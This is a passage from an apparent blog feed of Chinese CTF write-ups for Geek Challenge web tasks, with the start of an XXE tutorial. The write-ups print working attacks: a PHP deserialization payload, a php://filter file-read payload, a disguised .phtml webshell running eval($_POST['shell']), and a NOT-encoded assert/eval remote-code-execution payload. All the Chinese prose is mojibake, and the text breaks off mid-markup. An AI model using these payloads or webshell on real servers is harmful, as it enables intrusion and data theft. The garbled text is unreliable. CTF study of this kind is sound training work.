important">?></span></span></code></pre><p>åªéœ€è¦æ»¡è¶³<code>username=admin</code>å’Œ<code>password=100</code>å³å¯ï¼Œå¦å¤–è¦æ³¨æ„ç»•è¿‡__wakeup()ï¼Œä¿®æ”¹å±æ€§æ•°å³å¯(â€œNameâ€:2 -&gt; â€œNameâ€:3)</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>admin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22100</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment"># O:4:"Name":3:&#123;s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";&#125;</span></code></pre><h4 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h4><p>æ ¹æ®æºç æç¤º(secr3t.php)éœ€è¦æŠ“åŒ…è·å–ï¼Œå› ä¸ºä¼š302è·³è½¬</p><p>è®¿é—®å¾—åˆ°æºç </p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># secr3t.php&lt;html&gt;    &lt;title&gt;secret&lt;&#x2F;title&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file&#x3D;$_GET[&#39;file&#39;];    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); &#x2F;&#x2F;flagæ”¾åœ¨äº†flag.phpé‡Œ?&gt;&lt;&#x2F;html&gt;</code></pre><p>Payload: <code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p><h4 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h4><p>è¦æ±‚ä¸Šä¼ å›¾ç‰‡ï¼Œå¯¹æ–‡ä»¶ååç¼€æœ‰ä¸€äº›é™åˆ¶ï¼Œå¯ä»¥ç”¨phtmlç»•è¿‡ï¼Œä½†æ˜¯è¦æ±‚æ–‡ä»¶åä¸èƒ½æœ‰<code>&lt;?</code>è¿™ä¸ªå¯ä»¥ç”¨jsæ ¼å¼ç»•è¿‡</p><p>æœ€åçš„é™åˆ¶æ˜¯<code>Not Image</code>è¿™ä¸ªå¯åœ¨æ–‡ä»¶æ·»åŠ æ–‡ä»¶å¤´GIF89aç»•è¿‡</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">1</span><span class="token punctuation">.</span>phtmlGIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span>@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>ä¸Šä¼ æˆåŠŸåè®¿é—®<code>/upload/</code>ç„¶åè¿›è¡Œrceå³å¯</p><h4 id="RCE-ME-å¼‚æˆ–-å–å"><a href="#RCE-ME-å¼‚æˆ–-å–å" class="headerlink" title="RCE ME(å¼‚æˆ– å–å)"></a>RCE ME(å¼‚æˆ– å–å)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">&#125;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">&#125;</span>                    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// </span><span class="token delimiter important">?></span></span></code></pre><p>è¿™é‡Œä½¿ç”¨å–åï¼Œå…ˆçœ‹ä¸€ä¸‹phpinfo</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$funcation</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"(~<span class="token interpolation"><span class="token variable">$funcation</span></span>)(~<span class="token interpolation"><span class="token variable">$cmd</span></span>)"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="rceme.png" loading="lazy"></p><p>çœ‹åˆ°ç¦äº†å¾ˆå¤šå‡½æ•°<code>system,exec,shell_exec,popen</code></p><p>è¿™é‡Œå¯ä»¥ç”¨<code>assert</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$funcation</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'(eval($_POST[attack]))'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"(~<span class="token interpolation"><span class="token variable">$funcation</span></span>)(~<span class="token interpolation"><span class="token variable">$cmd</span></span>)"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">8</span>C<span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">8</span>D<span class="token operator">%</span><span class="token number">8</span>B<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">89</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token constant">D7</span><span class="token operator">%</span><span class="token constant">DB</span><span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token constant">B0</span><span class="token operator">%</span><span class="token constant">AC</span><span class="token operator">%</span><span class="token constant">AB</span><span class="token operator">%</span><span class="token constant">A4</span><span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">9</span>C<span class="token operator">%</span><span class="token number">94</span><span class="token operator">%</span><span class="token constant">A2</span><span class="token operator">%</span><span class="token constant">D6</span><span class="token operator">%</span><span class="token constant">D6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">POST</span><span class="token punctuation">:</span>attack<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ç„¶åä¸Šèšå‰‘è¿æ¥</p><p>æ ¹ç›®å½•ä¸‹æœ‰ä¸ªreadflagï¼Œéœ€è¦æ‰§è¡Œreadflagæ‰èƒ½å¾—åˆ°flagï¼Œä½†æ˜¯å› ä¸ºé™åˆ¶äº†å¾ˆå¤šå‡½æ•°ï¼Œæ‰€ä»¥ä¸å¤ªè¡Œ</p><p>å¯ä»¥ä½¿ç”¨èšå‰‘çš„ç»•è¿‡disable_functionsçš„æ’ä»¶(Linuxä¸‹)</p><p><img src="rceme_2.png" loading="lazy"></p><p><img src="rceme_3.png" loading="lazy"></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737">RCE ME</a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æå®¢å¤§æŒ‘æˆ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-xxe</title>
      <link href="/2024/08/05/web%E5%85%A5%E9%97%A8-xxe/"/>
      <url>/2024/08/05/web%E5%85%A5%E9%97%A8-xxe/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p><a href="https://www.cnblogs.com/r00tuser/p/7255939.html">[xxeæ¼æ´çš„å­¦ä¹ ä¸åˆ©ç”¨æ€»ç»“]</a></p><h4 id="xmlåŸºç¡€çŸ¥è¯†"><a href="#xmlåŸºç¡€çŸ¥è¯†" class="headerlink" title="xmlåŸºç¡€çŸ¥è¯†"></a>xmlåŸºç¡€çŸ¥è¯†</h4><p>è¦äº†è§£xxeæ¼æ´ï¼Œé‚£ä¹ˆä¸€å®šå¾—å…ˆæ˜ç™½åŸºç¡€çŸ¥è¯†ï¼Œäº†è§£xmlæ–‡æ¡£çš„åŸºç¡€ç»„æˆã€‚</p><pre class="language-markup" data-language="markup"><code class="language-markup">XMLç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥ç”¨æ¥æ ‡è®°æ•°æ®ã€å®šä¹‰æ•°æ®ç±»å‹ï¼Œæ˜¯ä¸€ç§å…è®¸ç”¨æˆ·å¯¹è‡ªå·±çš„æ ‡è®°è¯­è¨€è¿›è¡Œå®šä¹‰çš„æºè¯­è¨€ã€‚XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ </code></pre><h5 id="xmlæ–‡æ¡£çš„æ„å»ºæ¨¡å—"><a href="#xmlæ–‡æ¡£çš„æ„å»ºæ¨¡å—" class="headerlink" title="xmlæ–‡æ¡£çš„æ„å»ºæ¨¡å—"></a>xmlæ–‡æ¡£çš„æ„å»ºæ¨¡å—</h5><p>æ‰€æœ‰çš„ XML æ–‡æ¡£ï¼ˆä»¥åŠ HTML æ–‡æ¡£ï¼‰å‡ç”±ä»¥ä¸‹ç®€å•çš„æ„å»ºæ¨¡å—æ„æˆï¼š</p><pre class="language-markup" data-language="markup"><code class="language-markup">å…ƒç´ å±æ€§å®ä½“PCDATACDATA</code></pre><p>ä¸‹é¢æ˜¯æ¯ä¸ªæ„å»ºæ¨¡å—çš„ç®€è¦æè¿°ã€‚</p><h5 id="å…ƒç´ "><a href="#å…ƒç´ " class="headerlink" title="å…ƒç´ "></a>å…ƒç´ </h5><p>å…ƒç´ æ˜¯ XML ä»¥åŠ HTML æ–‡æ¡£çš„ä¸»è¦æ„å»ºæ¨¡å—ï¼Œå…ƒç´ å¯åŒ…å«æ–‡æœ¬ã€å…¶ä»–å…ƒç´ æˆ–è€…æ˜¯ç©ºçš„ã€‚<br>å®ä¾‹:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>body text in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>some message in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span></code></pre><p>ç©ºçš„ HTML å…ƒç´ çš„ä¾‹å­æ˜¯ â€œhrâ€ã€â€brâ€ ä»¥åŠ â€œimgâ€ã€‚</p><h5 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h5><p>å±æ€§å¯æä¾›æœ‰å…³å…ƒç´ çš„é¢å¤–ä¿¡æ¯<br>å®ä¾‹ï¼š</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>computer.gif<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><h5 id="å®ä½“"><a href="#å®ä½“" class="headerlink" title="å®ä½“"></a>å®ä½“</h5><p>å®ä½“æ˜¯ç”¨æ¥å®šä¹‰æ™®é€šæ–‡æœ¬çš„å˜é‡ã€‚å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</p><h5 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h5><p>PCDATA çš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ï¼ˆparsed character dataï¼‰ã€‚<br>PCDATA æ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚</p><h5 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h5><p>CDATA çš„æ„æ€æ˜¯å­—ç¬¦æ•°æ®ï¼ˆcharacter dataï¼‰ã€‚<br>CDATA æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚<br>DTD(æ–‡æ¡£ç±»å‹å®šä¹‰)</p><p>DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚</p><p>DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</p><h5 id="å†…éƒ¨å£°æ˜"><a href="#å†…éƒ¨å£°æ˜" class="headerlink" title="å†…éƒ¨å£°æ˜"></a>å†…éƒ¨å£°æ˜</h5><p> <strong>ex: <code>&lt;!DOCTYOE test any&gt;</code></strong></p><p>å®Œæ•´å®ä¾‹ï¼š</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to,from,heading,body)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>      <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre><h5 id="å¤–éƒ¨å£°æ˜ï¼ˆå¼•ç”¨å¤–éƒ¨DTDï¼‰"><a href="#å¤–éƒ¨å£°æ˜ï¼ˆå¼•ç”¨å¤–éƒ¨DTDï¼‰" class="headerlink" title="å¤–éƒ¨å£°æ˜ï¼ˆå¼•ç”¨å¤–éƒ¨DTDï¼‰"></a>å¤–éƒ¨å£°æ˜ï¼ˆå¼•ç”¨å¤–éƒ¨DTDï¼‰</h5><p> <strong>ex: <code>&lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt;</code></strong></p><p>å®Œæ•´å®ä¾‹:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token name">SYSTEM</span> <span class="token string">"note.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span> </code></pre><p>è€Œnote.dtdçš„å†…å®¹ä¸º:</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;</code></pre><h5 id="DTDå®ä½“"><a href="#DTDå®ä½“" class="headerlink" title="DTDå®ä½“"></a>DTDå®ä½“</h5><p>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p><p>å®ä½“åˆåˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“</p><h6 id="ä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•"><a href="#ä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•" class="headerlink" title="ä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•:"></a>ä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•:</h6><p>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š&amp;å®ä½“åï¼›</p><p><strong>å‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­ä½¿ç”¨ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ ¼å¼ï¼š</strong></p><p>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š%å®ä½“åï¼›</p><h6 id="å†…éƒ¨å®ä½“å£°æ˜"><a href="#å†…éƒ¨å®ä½“å£°æ˜" class="headerlink" title="å†…éƒ¨å®ä½“å£°æ˜"></a>å†…éƒ¨å®ä½“å£°æ˜</h6><p><strong>ex:<code>&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></strong></p><p>å®Œæ•´å®ä¾‹:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">writer</span> <span class="token attr-name">"Bill</span> <span class="token attr-name">Gates"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">copyright</span> <span class="token attr-name">"Copyright</span> <span class="token attr-name">W3School.com.cn"</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span></code></pre><h6 id="å¤–éƒ¨å®ä½“å£°æ˜"><a href="#å¤–éƒ¨å®ä½“å£°æ˜" class="headerlink" title="å¤–éƒ¨å®ä½“å£°æ˜"></a>å¤–éƒ¨å®ä½“å£°æ˜</h6><p>å®Œæ•´å®ä¾‹:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">&lt;!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span></code></pre><p>åœ¨äº†è§£äº†åŸºç¡€çŸ¥è¯†åï¼Œä¸‹é¢å¼€å§‹äº†è§£xmlå¤–éƒ¨å®ä½“æ³¨å…¥å¼•å‘çš„é—®é¢˜ã€‚<br>XXEçš„æ”»å‡»ä¸å±å®³ï¼ˆXML External Entityï¼‰</p><h5 id="ä½•ä¸ºXXE"><a href="#ä½•ä¸ºXXE" class="headerlink" title="ä½•ä¸ºXXE?"></a>ä½•ä¸ºXXE?</h5><p>ç­”ï¼š xxeä¹Ÿå°±æ˜¯xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚ä¹Ÿå°±æ˜¯ä¸Šæ–‡ä¸­åŠ ç²—çš„é‚£ä¸€éƒ¨åˆ†ã€‚</p><h4 id="æ€æ ·æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ"><a href="#æ€æ ·æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ" class="headerlink" title="æ€æ ·æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ"></a>æ€æ ·æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ</h4><p>æ–¹å¼ä¸€ï¼šç›´æ¥é€šè¿‡DTDå¤–éƒ¨å®ä½“å£°æ˜<br>æ–¹å¼äºŒï¼šé€šè¿‡DTDæ–‡æ¡£å¼•å…¥å¤–éƒ¨DTDæ–‡æ¡£ï¼Œå†å¼•å…¥å¤–éƒ¨å®ä½“å£°æ˜<br>æ–¹å¼ä¸‰ï¼šé€šè¿‡DTDå¤–éƒ¨å®ä½“å£°æ˜å¼•å…¥å¤–éƒ¨å®ä½“å£°æ˜ï¼ˆå¥½åƒæœ‰ç‚¹æ‹—å£ï¼Œå…¶å®æ„æ€å°±æ˜¯å…ˆå†™ä¸€ä¸ªå¤–éƒ¨å®ä½“å£°æ˜ï¼Œç„¶åå¼•ç”¨çš„æ˜¯åœ¨æ”»å‡»è€…æœåŠ¡å™¨ä¸Šé¢çš„å¤–éƒ¨å®ä½“å£°æ˜ï¼‰</p><h4 id="äº§ç”Ÿå“ªäº›å±å®³ï¼Ÿ"><a href="#äº§ç”Ÿå“ªäº›å±å®³ï¼Ÿ" class="headerlink" title="äº§ç”Ÿå“ªäº›å±å®³ï¼Ÿ"></a>äº§ç”Ÿå“ªäº›å±å®³ï¼Ÿ</h4><p>XXEå±å®³1ï¼šè¯»å–ä»»æ„æ–‡ä»¶<br>XXEå±å®³2ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br>XXEå±å®³3ï¼šæ¢æµ‹å†…ç½‘ç«¯å£<br>XXEå±å®³4ï¼šæ”»å‡»å†…ç½‘ç½‘ç«™</p><h4 id="å¦‚ä½•é˜²å¾¡xxeæ”»å‡»"><a href="#å¦‚ä½•é˜²å¾¡xxeæ”»å‡»" class="headerlink" 